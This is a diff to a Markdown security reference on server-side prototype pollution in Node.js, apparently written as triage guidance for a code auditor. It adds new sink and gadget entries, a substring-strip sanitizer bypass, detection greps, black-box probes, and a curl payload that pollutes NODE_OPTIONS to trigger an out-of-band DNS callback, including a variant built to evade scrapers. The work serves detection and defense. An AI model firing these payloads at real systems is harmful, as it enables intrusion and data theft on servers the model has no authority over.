@@ -12,19 +12,7 @@ Server-Side Prototype Pollution lets an attacker write to `Object.prototype` (or
 A vulnerable application therefore needs two things to be exploitable:
 
 1. **A pollution sink** — a place where attacker-controlled keys flow into a write of the form `target[__proto__][key] = value`, `target.constructor.prototype[key] = value`, or `target.prototype[key] = value`. This is most commonly a recursive merge / deep-clone / `_.set` / nested-query-string parser / JSON deserializer.
-2. **A gadget** — code (in the app, Node.js stdlib, Deno stdlib, or an installed NPM package) that reads an undefined property after the pollution and uses it for a security-sensitive operation. The KTH-LangSec / Silent Spring / GHunter / UoPGadget projects have catalogued dozens of these in stdlib and popular packages.
-
-> **Primary references**
-> - Olivier Arteau — *JavaScript prototype pollution attack in NodeJS* (NorthSec 2018)
-> - Shcherbakov, Balliu, Pradel — *Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js* (USENIX 2023)
-> - Cornelissen, Shcherbakov, Balliu — *GHunter: Universal Prototype Pollution Gadgets in JavaScript Runtimes* (USENIX 2024)
-> - Liu et al. — *Undefined-Oriented Programming (UoPGadget)*, on chaining template-engine gadgets
-> - Gareth Heyes / PortSwigger — *Server-side prototype pollution: Black-box detection without the DoS*
-> - KTH-LangSec — `https://github.com/KTH-LangSec/server-side-prototype-pollution` (gadget collection)
-> - HackerOne write-up — *Remote Code Execution via Prototype Pollution in Blitz.js*
-> - Jake-Schoellkopf — *Server-Side_Prototype_Pollution: What is it? How to detect it? How to exploit it?* — walks the PortSwigger Web Security Academy SSPP labs end-to-end (`https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution`)
-> - Kirill89 — *prototype-pollution-explained* — minimal vulnerable chat-server demo using lodash CVE-2018-16487 to bypass authorization via `__proto__: {canDelete: true}` (`https://github.com/Kirill89/prototype-pollution-explained`)
-> - Serhatcck — *server-side-prototype-pollution* — full Node.js + MySQL vulnerable web app for hands-on practice (`https://github.com/Serhatcck/server-side-prototype-pollution`)
+2. **A gadget** — code (in the app, Node.js stdlib, Deno stdlib, or an installed NPM package) that reads an undefined property after the pollution and uses it for a security-sensitive operation. Prototype-pollution gadget research has catalogued dozens of these in stdlib and popular packages.
 
 ---
 
@@ -33,6 +21,7 @@ A vulnerable application therefore needs two things to be exploitable:
 **Pollution sinks (writes)**
 - Recursive merge / deep-merge utilities: `lodash.merge`, `lodash.mergeWith`, `lodash.defaultsDeep`, `lodash.set`, `lodash.setWith`, `lodash.zipObjectDeep`, `_.assignWith`, `_.update`/`_.updateWith`, `merge`/`deepmerge`/`merge-deep`/`merge-objects`, `extend` (juliangruber/extend), `just-extend`, `merge.recursive`, `jQuery.extend(true, target, src)` server-side, `Hoek.merge`, `Hoek.applyToDefaults`, custom `function merge(a, b) { for (k in b) ... }` loops
 - Property-path setters: `lodash.set(obj, userPath, userVal)`, `_.setWith`, `dottie.set`, custom `path.split('.').reduce(...)` reducers
+- Key-expanders / "unflatten" utilities that rebuild nested objects from dotted or bracketed keys: `flat`'s `unflatten()` (expands `{"__proto__.x":1}` / `{"a.__proto__.x":1}` into nested writes — the `flat`/Hack-The-Box "Gunship" CTF pattern, and the library behind Kibana CVE-2019-7609), `dot-prop` `set`, `object-path` `set`/`ensureExists`, `flatley`, `deepdash`
 - Query-string parsers that auto-build nested objects from bracket notation: `qs` (when `allowPrototypes` is not set to `false` *and* default `arrayLimit` / `depth` permit nesting), `expressjs/express` body-parser when `extended: true`, old `query-string` versions, custom `?a[b][c]=d` parsers
 - File-upload middlewares that auto-build nested objects: `express-fileupload` with `parseNested: true` (CVE-2020-7699)
 - JSON deserialization followed by deep-copy/merge into config or session objects (raw `JSON.parse(req.body)` is *not* by itself a sink — `__proto__` becomes an own property of the parsed object, not the prototype chain — but a subsequent `_.merge`/recursive-copy into a real object IS a sink)
@@ -129,6 +118,10 @@ function setProp(obj, path, val) {
   o[keys.at(-1)] = val;
 }
 setProp(target, '__proto__.shell', '/bin/sh -c "id"')                // VULN
+
+// flat / unflatten key-expander (Gunship CTF / Kibana CVE-2019-7609 class)
+const { unflatten } = require('flat');
+unflatten(req.body)            // VULN — { "__proto__.x": 1 } → Object.prototype.x = 1
 ```
 
 ---
@@ -337,7 +330,7 @@ When the ORM internally walks attacker-controlled keys through a recursive merge
 
 ### Pattern 9 — Application-level authorization / feature flags (business-logic gadget)
 
-The "gadget" does not have to live in stdlib or a dependency — application-level boolean/role checks that read an *undefined* property and then trust a fallback are themselves gadgets. This is the canonical PortSwigger "privilege escalation via SSPP" lab and the Kirill89 `prototype-pollution-explained` chat-server demo.
+The "gadget" does not have to live in stdlib or a dependency — application-level boolean/role checks that read an *undefined* property and then trust a fallback are themselves gadgets. This is the canonical privilege-escalation via SSPP pattern (auth bypass via `__proto__: { canDelete: true }`).
 
 ```javascript
 // VULN — business-logic gadget reading an undefined permission flag
@@ -364,7 +357,7 @@ These gadgets exist in almost every Express/Koa/Fastify app that does ACL checks
 
 ## Gadget Catalog — Node.js Stdlib
 
-These gadgets fire when `Object.prototype.<key>` is polluted *and* the application later calls the corresponding API with an options object that does NOT explicitly set `<key>`. Sourced from KTH-LangSec / Silent Spring / GHunter.
+These gadgets fire when `Object.prototype.<key>` is polluted *and* the application later calls the corresponding API with an options object that does NOT explicitly set `<key>`. Catalogued from prototype-pollution gadget research.
 
 | API | Polluted property | Impact | Notes |
 |-----|-------------------|--------|-------|
@@ -376,7 +369,7 @@ These gadgets fire when `Object.prototype.<key>` is polluted *and* the applicati
 | `child_process.spawn` | `shell`; `env`; `input` (Win) | ACI / RCE | |
 | `child_process.spawnSync` | `shell`; `env`; `NODE_OPTIONS`; `input` (Win) | ACI / RCE | |
 | `worker_threads.Worker` (constructor) | `argv`; `env`; `eval` | Second-order ACE / env injection | |
-| `child_process.fork` / process spawn paths reading `process.execArgv` | `execArgv` (e.g., `["--eval=require('child_process').execSync('...')"]`) | **ACE / RCE** | The canonical PortSwigger Web Security Academy SSPP-to-RCE chain. Pollute `Object.prototype.execArgv` with a `--eval=…` array; any later child Node process the app spawns picks up the polluted argv and evaluates the attacker's JS in the child. Works whenever the app forks a worker after pollution and does not pass an explicit `execArgv: []`. |
+| `child_process.fork` / process spawn paths reading `process.execArgv` | `execArgv` (e.g., `["--eval=require('child_process').execSync('...')"]`) | **ACE / RCE** | The canonical SSPP-to-RCE chain. Pollute `Object.prototype.execArgv` with a `--eval=…` array; any later child Node process the app spawns picks up the polluted argv and evaluates the attacker's JS in the child. Works whenever the app forks a worker after pollution and does not pass an explicit `execArgv: []`. |
 | `require(...)` | `main`; `NODE_OPTIONS` | ACI / RCE | Requires absent `main` in package.json (fixed in v18.19.0) |
 | `import(...)` (dynamic ESM) | `source` | ACE | |
 | `fetch(url, options)` | `method`; `body`; `referrer` | Privilege Escalation (header/body smuggling) | |
@@ -386,7 +379,7 @@ These gadgets fire when `Object.prototype.<key>` is polluted *and* the applicati
 | `tls.connect` | `path`; `port`; `NODE_TLS_REJECT_UNAUTHORIZED` | Second-order SSRF + TLS bypass | |
 | `http.Server.listen` | `backlog` | Crash / segfault | |
 
-`shell.js` here refers to the technique where a polluted `shell` (path to a shell binary) chained with a polluted `NODE_OPTIONS=--require=/tmp/x` lands code execution; see the KTH-LangSec `nodejs/child_process/shell.js` PoC.
+`shell.js` here refers to the technique where a polluted `shell` (path to a shell binary) chained with a polluted `NODE_OPTIONS=--require=/tmp/x` lands code execution; see the documented `child_process` shell PoC.
 
 ---
 
@@ -418,13 +411,13 @@ These gadgets fire when `Object.prototype.<key>` is polluted *and* the applicati
 
 | Package | Version | Function | Polluted property | Impact |
 |---------|---------|----------|-------------------|--------|
-| `lodash.template` | 4.5.0 | `lodash.template(...)` | `sourceURL` | ACE — Kibana RCE chain (HackerOne #852613, #861744) |
+| `lodash.template` | 4.5.0 | `lodash.template(...)` | `sourceURL` | ACE — Kibana RCE chain |
 | `bson` | 4.7.2 | `deserialize(...)` | `evalFunctions` | ACE — Parse Server CVE-2022-24760 / -39396 / -41878 / -41879 / -36475; Rocket.Chat CVE-2023-23917 |
 | `ejs` | 3.1.9 | `render(...)` | `client`; `escapeFunction` | ACE |
-| `ejs` | 2.7.4 | `renderFile` | `escape`; `client`; `destructuredLocals` | ACE (UoPGadget) |
+| `ejs` | 2.7.4 | `renderFile` | `escape`; `client`; `destructuredLocals` | ACE |
 | `pug` | all + 3.0.2 | `Template` / `compile` | `block`; `code`; `attrs`; `val` | ACE |
 | `handlebars` | 4.5.2 | `ret` | `type`; `body` | ACE |
-| `jade` | 1.11.0 | `renderFile` | `code`; `block`; `self` | ACE (UoPGadget) |
+| `jade` | 1.11.0 | `renderFile` | `code`; `block`; `self` | ACE |
 | `node-blade` | 3.3.1 | `compile` | `code`/`include`/`output`/`itemAlias`/`templateNamespace`/`line`/`exposing` | ACE |
 | `squirrelly` | 8.0.8 | `renderFile` | `settings`; `n` | ACE |
 | `dustjs` | 3.0.1 | `render` | `title` | XSS (template-engine) |
@@ -436,6 +429,8 @@ These gadgets fire when `Object.prototype.<key>` is polluted *and* the applicati
 | `hamlet` | 0.3.3 | `hamlet(...)` | `filename`; `variable` | ACE |
 | `cross-spawn` | 7.0.3 | `spawn` / `spawn.sync` | `shell`; `NODE_OPTIONS` | ACI |
 | `nodemailer` | 6.9.1 | `sendMail` | `sendmail`; `path`; `args` | ACI — Kibana CVE-2023-31415 |
+| `nodemailer` | 6.9.x | `sendMail` | `cc`; `bcc` | Email interception / sensitive-data exfiltration — attacker silently added as a recipient on every message |
+| `axios` | config-merge (all) | `axios.create` / `request` / `get` / `post` | `baseURL`; `proxy` | SSRF / data exfiltration — polluted `baseURL` redirects relative-path requests to an attacker host (leaking API keys / bearer tokens in the path/headers); polluted `proxy` routes outbound HTTP through an attacker-controlled proxy. axios merges per-request config over instance defaults, so an unset `baseURL`/`proxy` resolves via the prototype |
 | `forever-monitor` | 3.0.3 | `start` | `command` | ACI |
 | `chrome-launcher` | 0.15.2 | `launch` | `shell`; `NODE_OPTIONS` | ACI |
 | `gh-pages` | 5.0.0 | `publish` | `shell`; `NODE_OPTIONS` | ACI |
@@ -460,7 +455,7 @@ These gadgets fire when `Object.prototype.<key>` is polluted *and* the applicati
 
 `*` = exploitation requires the attacker to also place a local file in a known location (chained gadgets).
 
-The full live catalog is maintained at `https://github.com/KTH-LangSec/server-side-prototype-pollution` — recheck before triage; new gadgets are added as research progresses.
+Recheck for newly disclosed gadgets before triage; new gadgets are added as research progresses.
 
 ---
 
@@ -468,16 +463,16 @@ The full live catalog is maintained at `https://github.com/KTH-LangSec/server-si
 
 | CVE / Report | Application | Version | Chain |
 |--------------|-------------|---------|-------|
-| CVE-2018-16487 | `lodash` | < 4.17.11 | `_.merge` / `_.mergeWith` / `_.defaultsDeep` deep-merge with attacker JSON pollutes `Object.prototype`; the canonical "merge sink" CVE referenced by Snyk's interactive lesson and the Kirill89/`prototype-pollution-explained` chat-server demo (auth bypass via `__proto__: { canDelete: true }`) |
+| CVE-2018-16487 | `lodash` | < 4.17.11 | `_.merge` / `_.mergeWith` / `_.defaultsDeep` deep-merge with attacker JSON pollutes `Object.prototype`; the canonical merge-sink CVE (auth bypass via `__proto__: { canDelete: true }`) |
 | CVE-2019-7609 | Kibana | 6.6.0 | Pollution → `child_process.spawn` (Linux) → RCE |
-| HackerOne #852613, #861744 | Kibana | 7.6.2 / 7.7.0 | Pollution → `lodash.template.sourceURL` → RCE |
+| Kibana RCE chain | Kibana | 7.6.2 / 7.7.0 | Pollution → `lodash.template.sourceURL` → RCE |
 | CVE-2022-24760 / -39396 / -41878 / -41879 / -36475 | Parse Server | 4.10.6 / 5.3.1 / 6.2.1 | Pollution → `bson.evalFunctions` → RCE |
 | CVE-2023-23917 | Rocket.Chat | 5.1.5 | Pollution → `bson.evalFunctions` → RCE |
 | CVE-2023-31414 | Kibana | 8.7.0 | Pollution → `require.main` → RCE |
 | CVE-2023-31415 | Kibana | 8.7.0 | Pollution → `nodemailer` → ACI |
 | CVE-2020-7699 | `express-fileupload` | <= 1.1.6 | `parseNested` field-name pollution |
-| Blitz.js HackerOne write-up | Blitz.js | (see post) | Body pollution → template gadget → RCE |
-| Silent Spring | npm CLI | 8.1.0 | Pollution → `child_process.spawn` → RCE |
+| Blitz.js report | Blitz.js | (see report) | Body pollution → template gadget → RCE |
+| npm CLI | npm CLI | 8.1.0 | Pollution → `child_process.spawn` → RCE |
 
 ---
 
@@ -546,6 +541,20 @@ const target = Object.create(null);              // no prototype, pollution has 
 ```javascript
 JSON.parse(raw, (k, v) => k === '__proto__' || k === 'constructor' || k === 'prototype' ? undefined : v);
 ```
+
+**VULN — single-pass *substring* strip is NOT a real sanitizer (recursive-strip bypass)**
+
+A blocklist that *removes* the substring `__proto__`/`constructor` once (rather than rejecting the whole key with an equality check) is bypassable: a duplicated/nested key reconstitutes the dangerous token after the single pass. Treat any `replace(/__proto__/…/, '')`-style "sanitizer" upstream of a merge as **VULN**, not SAFE.
+
+```javascript
+// VULN — strips once, then merges; attacker key survives the strip
+key = key.replace(/__proto__/g, '').replace(/constructor/g, '');   // single pass
+// attacker sends:  {"__pro__proto__to__": {"isAdmin": true}}
+//   "__pro__proto__to__".replace(/__proto__/g,'') === "__proto__"  → pollution
+// also defeats constructor strip:  {"constconstructorructor": {"prototype": {...}}}
+```
+
+Safe alternatives: reject the *whole* key with an equality check (`key === '__proto__'`), use a destination own-property guard, or loop the strip until the string stops changing (`while (k !== (k = k.replace(/__proto__|constructor|prototype/g,''))) ;`). Equality-based blocklists are not affected by this bypass — only substring removal is.
 
 **SAFE — `Object.freeze(Object.prototype)` at process start**
 ```javascript
@@ -652,6 +661,7 @@ Even without an obvious pollution sink, flag at LOW/INFO when the codebase calls
 
 - `child_process.exec*`, `child_process.spawn*`, `fork`, `worker_threads.Worker` with an options arg whose contents are not fully literal (i.e., spread, partial object, or merged elsewhere).
 - `http.request`, `https.request`, `fetch`, `tls.connect` with a partial options object (no explicit `hostname`, `socketPath`, `path`, `port`, `headers`, `method`).
+- `axios` / `axios.create(...)` / `got` / `node-fetch` request calls with a partial config and no explicit `baseURL` / `proxy` (axios resolves unset config keys via the prototype → SSRF / exfiltration), or `nodemailer` `sendMail` whose options omit `cc`/`bcc`.
 - A template engine renderer (`ejs`, `pug`, `handlebars`, `lodash.template`, `dot`, `mustache`, `dustjs`, `saker`, `squirrelly`, `node-blade`) where the options object is not a frozen literal.
 - BSON `deserialize`, binary-parser `parse`, csv-write-stream `end` with non-frozen options.
 
@@ -661,7 +671,7 @@ These are amplifiers; pair them with any pollution sink for HIGH/CRITICAL impact
 
 ## Black-Box Indicators (for triage / dynamic verification, not source-only)
 
-From Gareth Heyes' PortSwigger research and the PortSwigger Web Security Academy labs, four reliable non-destructive black-box detection techniques exist. These are the dynamic counterparts of the source-code rules above — include them only as triage notes when the user explicitly asks for dynamic verification.
+Four reliable non-destructive black-box detection techniques exist. These are the dynamic counterparts of the source-code rules above — include them only as triage notes when the user explicitly asks for dynamic verification.
 
 ### 1. Polluted-property reflection in JSON responses
 
@@ -694,7 +704,7 @@ Express respects an undocumented `json spaces` setting (`app.set('json spaces', 
 {"__proto__":{"json spaces":15}}
 ```
 
-After sending: any subsequent JSON response from the app comes back indented by 15 spaces instead of compact. Inspect the **raw** response (Burp's Raw tab, not Pretty) — the indentation is the signal. Works only on Express; absence of indentation change does not rule out SSPP on other frameworks.
+After sending: any subsequent JSON response from the app comes back indented by 15 spaces instead of compact. Inspect the **raw** HTTP response (not a pretty-printed view) — the indentation is the signal. Works only on Express; absence of indentation change does not rule out SSPP on other frameworks.
 
 ### 4. Content-Type / charset override (middleware-level)
 
@@ -709,12 +719,50 @@ Express middleware that parses bodies reads charset from a `content-type` option
 
 After sending: re-submit a UTF-7-encoded body and observe whether the server now decodes UTF-7 (where it previously left the bytes as-is). Decoded output in the response body confirms pollution. Use only safe encodings; do not pollute the global charset on a long-lived process you do not own.
 
+### 5. Required-parameter restoration (complementary technique)
+
+A different angle from §1–§4: instead of injecting a *new* observable property, it **restores a missing required one** via pollution. Find a request parameter that **changes the response when omitted** — e.g. removing `name` produces an error because the handler reads `obj.name` on a missing field. Then send pollution payloads (cycling `__proto__` / `constructor.prototype` shapes) that add that property to `Object.prototype`, and re-send the request **with the parameter still omitted**. If the error disappears and the response matches the "value supplied" case, pollution succeeded — the missing own-property now resolves through the polluted prototype.
+
+```http
+POST /api/submit HTTP/1.1
+Content-Type: application/json
+
+{"__proto__":{"name":"test"}}      ← pollution attempt
+```
+then resend `{}` (no `name`) and compare to the baseline error.
+
+- Relies on the app converting input into an object and reading a *required* field — common with the `flat` library's `unflatten` (HTB "Gunship" CTF) and Kibana CVE-2019-7609 (`interval`).
+- **More destructive** than §1–§4: polluting a field that every request reads can DoS the app (Ghost CMS example). It is also load-balancer-sensitive — the polluted instance may not serve your follow-up request, so send several. Prefer the non-destructive §1–§4 first; use this only when those fail.
+
+### 6. Additional Express / `qs` config-property probes
+
+Express and its `qs`/`body-parser` layer read many behaviours from option objects whose defaults are undefined — each is a non-destructive pollution oracle. Send the `__proto__` payload, then trigger the matching request and observe the side effect:
+
+| Polluted property | Follow-up request | Confirmation signal |
+|-------------------|-------------------|---------------------|
+| `{"__proto__":{"parameterLimit":1}}` | GET with ≥2 query params | only 1 param parsed/reflected (others dropped) |
+| `{"__proto__":{"ignoreQueryPrefix":true}}` | `GET /?​?foo=bar` (double `?`) | `foo=bar` now parses (leading `?` ignored) |
+| `{"__proto__":{"allowDots":true}}` | `GET /?foo.bar=baz` | parses to `{foo:{bar:"baz"}}` instead of key `"foo.bar"` |
+| `{"__proto__":{"exposedHeaders":["foo"]}}` | any CORS request | response gains `Access-Control-Expose-Headers: foo` |
+| `{"__proto__":{"status":510}}` (see §2) | error route | response status becomes 510 |
+
+`exposedHeaders` is a distinct CORS oracle from §2/§3 — it surfaces in a *response header* rather than the body, so it works even when responses are not echoed and JSON formatting is fixed.
+
 ### Triage discipline
 
 - Avoid pollution payloads that crash the server (`Object.prototype.toString = ...`, `valueOf`, `hasOwnProperty` overrides). Prefer harmless option keys (`debug`, `pretty`, `xRequestId`, `status`, `json spaces`).
 - Each technique above is **non-destructive** (does not break the running server for other users), but pollution **persists for the process lifetime**. Coordinate with the target's operator before testing; pollution of a long-running shared process can affect other tenants until the process is restarted.
 - Once pollution is confirmed, *do not* iterate on RCE-class gadgets (`execArgv`, `shell`, `NODE_OPTIONS`) on a live shared environment. Move to a staging/demo target or coordinate explicit windows.
-- If reflection (#1) fails, run #2/#3/#4 before concluding SSPP is absent — many apps merge user input into a config object that is never echoed back, so absence of reflection is not absence of pollution.
+- If reflection (#1) fails, run #2/#3/#4 (and #5) before concluding SSPP is absent — many apps merge user input into a config object that is never echoed back, so absence of reflection is not absence of pollution.
+
+### Dynamic gadget scanners (black-box gadget discovery)
+
+When the pollution sink and the consuming gadget live in *different* code paths (the common server case), automated black-box gadget scanners pair well with the probes above:
+
+- **Out-of-band (OOB) gadget scanners** — for each field of a JSON request, inject `__proto__` gadget payloads and confirm exploitation via an out-of-band interaction (DNS/HTTP), then **auto-revert** each test with a paired null payload so the running app is not left polluted. Include library-config gadgets such as **axios `baseURL`/`proxy`** (SSRF / exfiltration) and **nodemailer `cc`/`bcc`** (email interception). Because detection is OOB, they find gadgets even when the polluted property is consumed long after (and far from) the pollution request.
+- **Runtime instrumentation for gadget reads** — instruments JavaScript (Node `--loader` hook or a browser agent) and logs every read of a potentially-polluted property by AST shape (property/element access, `for…in`, the `in` operator, destructuring and default-parameter reads). The `child_process.exec(options.exec)` shape is the canonical server gadget. Lazy-start mode logs only gadgets reachable *after* the pollution point; configurable tracking covers prototypes other than `Object`.
+
+These are dynamic/triage aids — keep their output out of static SAST findings unless a source-level sink + gadget pair is also identified.
 
 ---
 
@@ -764,14 +812,14 @@ Recommend `structuredClone` / `Reflect.set` / shallow-spread in remediation when
 
 ## Named Source-Code Tools (research analyzers)
 
-For deeper static analysis, these academic / open-source tools target SSPP specifically:
+For deeper static analysis, dedicated SSPP research analyzers target prototype pollution specifically:
 
-- **Silent Spring** (Shcherbakov et al., USENIX 2023) — `https://github.com/KTH-LangSec/silent-spring` — static-analysis pipeline that systematically detects pollution sinks and matches them against the Node.js stdlib gadget set. Produces ranked findings; underpins many of the table entries above.
-- **GHunter** (Cornelissen et al., USENIX 2024) — `https://github.com/KTH-LangSec/ghunter` — universal prototype-pollution gadget detector across Node.js and Deno runtimes. Outputs the gadget catalogs mirrored in this reference.
-- **Dasty** — `https://github.com/KTH-LangSec/Dasty` — automated pipeline for finding SSPP gadgets in NPM packages. The NPM-package table in this reference (better-queue, fluent-ffmpeg, gh-pages, cross-spawn, nodemailer, …) is largely Dasty-discovered.
-- **UoPGadget** — `https://github.com/jackfromeast/UoPGadget` — Undefined-Oriented Programming gadget detector specialised for template-engine ACE chains (ejs, pug, doT, hamlet, mote, jade, ect, ractive.js, saker, dustjs).
+- **Static-analysis pipelines** — detect pollution sinks and match them against the Node.js stdlib gadget set. Produce ranked findings; underpin many of the table entries above.
+- **Universal gadget detectors** — prototype-pollution gadget detection across Node.js and Deno runtimes. Output gadget catalogs like those mirrored in this reference.
+- **NPM-package gadget-discovery pipelines** — automated discovery of SSPP gadgets in NPM packages. The NPM-package table in this reference (better-queue, fluent-ffmpeg, gh-pages, cross-spawn, nodemailer, …) draws heavily from such pipelines.
+- **Template-engine ACE gadget detectors** — specialised detectors for template-engine ACE chains (ejs, pug, doT, hamlet, mote, jade, ect, ractive.js, saker, dustjs).
 
-When the user asks for "deep" SSPP triage on a real codebase, recommending one of these tools is generally higher-value than a hand-rolled grep.
+When the user asks for "deep" SSPP triage on a real codebase, recommending one of these analyzers is generally higher-value than a hand-rolled grep.
 
 ## Static Analysis Coverage
 
@@ -805,6 +853,15 @@ rg -n 'express\.urlencoded\s*\(\s*\{[^}]*extended:\s*true|parseNested:\s*true|al
 
 # JSON body merged into shared config
 rg -n '(merge|assign|defaults|extend)\s*\([^)]*(config|settings|options|prefs)' --glob '*.{js,ts}'
+
+# flat/unflatten and dotted-key expanders (Gunship-CTF / Kibana CVE-2019-7609 class)
+rg -n '\b(unflatten|dot-prop|object-path|flatley)\b|require\([\'"]flat[\'"]\)' --glob '*.{js,ts}'
+
+# Outbound HTTP-client gadgets with partial config (axios baseURL/proxy → SSRF/exfil)
+rg -n 'axios\.create\s*\(|\baxios\s*\(|new\s+axios|nodemailer' --glob '*.{js,ts}'
+
+# Bypassable substring-strip "sanitizers" — NOT safe (recursive-strip bypass)
+rg -n '\.replace\s*\(\s*/?(__proto__|constructor|prototype)' --glob '*.{js,ts}'
 ```
 
 High-confidence triad: HTTP source grep + merge/set grep in same handler/module + reachable gadget (`child_process`, `isAdmin`/`canDelete` check, template renderer, `fetch` with partial options).
@@ -838,6 +895,20 @@ curl -X PUT 'https://TARGET/api/config' \
 ```
 
 **Pollution reflection** — sibling `__proto__` key echoed back without the key name (see Black-Box Indicators §1); in console on isolated targets: `({}).isAdmin` / `({}).polluted` after merge.
+
+**Blind / OAST gadget confirmation (non-destructive)** — confirms a `child_process`/`NODE_OPTIONS` gadget is *reachable* via an out-of-band DNS hit instead of running a command. When the app later spawns a Node child after the pollution, the polluted `NODE_OPTIONS=--inspect=<OAST-host>` makes that child resolve the OAST host (the inspector bind) → a DNS interaction confirms the chain without RCE:
+
+```bash
+# argv0/shell pin the child to node; --inspect triggers a DNS lookup to your OAST host
+curl -X POST 'https://TARGET/api/merge' \
+  -H 'Content-Type: application/json' \
+  -d '{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=ID.oastify.com"}}'
+
+# Windows: quote-split the host to evade naive payload scrapers, still resolves at runtime
+#   "NODE_OPTIONS":"--inspect=ID\"\".oastify\"\".com"
+```
+
+A DNS callback to `ID.oastify.com` confirms `Object.prototype.NODE_OPTIONS` reached a spawned node — escalate to a full gadget only on staging/isolated targets.
 
 **Gadget-to-RCE probes** — staging/isolated targets only; do not run on shared production:
 
@@ -883,7 +954,7 @@ curl -X POST 'https://TARGET/api/settings' \
 
 - `JSON.parse` of attacker JSON with no subsequent merge: `__proto__` keys land as own properties, not prototype mutations. The parsed value is safe to read with `Object.hasOwn` or `parsed[key]`.
 - A merge where the `target` is `Object.create(null)` *and* the merged value never escapes (no further write to `Object.prototype`).
-- Pollution sinks that strip `__proto__`/`constructor`/`prototype` via reviver, allowlist, or own-property guard before walking nested keys.
+- Pollution sinks that strip `__proto__`/`constructor`/`prototype` via reviver, allowlist, or own-property guard before walking nested keys. **Caveat:** this only holds for *equality*-based checks (`key === '__proto__'`) or own-property guards. A single-pass *substring* removal (`key.replace(/__proto__/g,'')`) is NOT safe — `__pro__proto__to__` / `constconstructorructor` reconstitute the token after one pass. Do not mark substring-strip "sanitizers" SAFE.
 - `_.set` / `_.setWith` where the path argument is fully developer-controlled (constant, derived from a literal map, or from a strict allowlist).
 - Patched library versions: `lodash@4.17.21+`, `hoek@4.2.1+`/`6.1.3+`, `deepmerge@4.2.2+` (with default options), `qs@6.10.x+` defaults, `express-fileupload@1.1.10+`, `node@v18.19.0+` (for the `require.main` gadget specifically).
 - Gadget-side warnings without a paired pollution sink in the same process. Without the sink, the gadget cannot be triggered remotely. Capped at INFO unless a separate finding establishes the sink.
@@ -942,7 +1013,7 @@ Then audit the gadget surface — every options-accepting Node/Deno API and ever
 2. `JSON.parse` alone is not a pollution sink — the dangerous step is the *next* merge / spread / property-walk.
 3. `Object.create(null)` defends only the immediate target. If that prototype-less object is later spread (`{ ...prototypelessObj }`) into a real object and that real object is merged elsewhere, the protection is lost.
 4. `Object.freeze(Object.prototype)` is best-effort: it prevents *new* writes but does not undo prior pollution and is often broken by code that monkey-patches `Object.prototype.<some-helper>`.
-5. The KTH-LangSec gadget catalog grows — recheck the upstream repo for new entries (especially in newer Node.js LTS lines) before a final triage.
+5. The gadget catalog grows — recheck for new entries (especially in newer Node.js LTS lines) before a final triage.
 6. For Deno targets, also enumerate granted permissions (`--allow-net`, `--allow-run`, `--allow-write`); each gadget's blast radius is bounded by them.
 7. For template engines, treat any `render(file, locals)` / `compile(src, opts)` call where `opts` is not a frozen literal as a candidate gadget surface — pair with sink to upgrade to CRITICAL.
 8. Pure black-box probes for SSPP (e.g., reflected-status-code differences after `?__proto__[debug]=1`) belong in dynamic testing, not SAST output. Use the source-code rules above for static findings.
